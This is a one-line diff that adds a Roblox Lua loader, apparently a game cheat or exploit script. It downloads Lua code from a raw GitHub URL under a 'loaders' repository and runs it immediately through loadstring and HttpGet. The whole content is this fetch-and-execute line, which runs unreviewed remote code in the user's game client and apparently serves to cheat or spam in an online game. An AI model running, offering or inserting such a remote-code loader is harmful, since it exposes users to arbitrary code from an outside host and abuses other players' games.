@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/ch2-chop-a-forest-spam7-8vtmf51vl6p2xc.lua"))()
